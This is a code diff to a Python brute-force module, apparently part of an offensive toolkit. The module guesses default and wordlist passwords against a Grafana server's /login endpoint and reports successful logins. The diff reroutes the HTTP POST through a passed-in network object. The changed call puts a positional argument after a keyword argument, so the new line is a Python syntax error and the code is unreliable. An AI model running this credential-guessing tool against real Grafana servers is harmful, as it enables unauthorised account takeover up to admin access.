@@ -22,14 +22,14 @@ and get user login access up to admin.
 REQUIRED_OPTIONS = {"IP": "", "PORT": "", "PASS": ""}
 
 
-def test_grafana(target_ip, port, username, password):
+def test_grafana(target_ip, port, username, password, net):
     """Trying to login to grafana using requests (HTTP POST)."""
     login_url = f"http://{target_ip}:{port}/login"
     payload = {"user": username, "password": password}
     headers = {"Content-Type": "application/json"}
     try:
-        response = requests.post(
-            login_url, json=payload, headers=headers, timeout=3, allow_redirects=False
+        response = net.http_request(
+            method="post", login_url, json=payload, headers=headers, timeout=3, redirect=False
         )
 
         if response.status_code == 302 and "location" in response.headers:
@@ -40,7 +40,7 @@ def test_grafana(target_ip, port, username, password):
         return False
 
 
-def execute(options):
+def execute(options, net):
     """Operate BruteForce on service Grafana."""
     target_ip = options.get("IP")
     port = options.get("PORT")
@@ -49,7 +49,7 @@ def execute(options):
     found_weak_creds = False
     try:
         for user, passwd in DEFAULT_CREDS:
-            if test_grafana(target_ip, port, user, passwd):
+            if test_grafana(target_ip, port, user, passwd, net):
                 smf.printf(
                     f"{C.SUCCESS}   LOGIN SUCCESS! (Grafana) -> U:{user} P:{passwd}"
                 )
@@ -68,7 +68,7 @@ def execute(options):
                             passwd = line.strip()
                             if not passwd:
                                 continue
-                            if test_grafana(target_ip, port, target_user, passwd):
+                            if test_grafana(target_ip, port, target_user, passwd, net):
                                 smf.printf(
                                     f"{C.SUCCESS}   LOGIN SUCCESS! (Grafana) -> U:{target_user} P:{passwd}"
                                 )
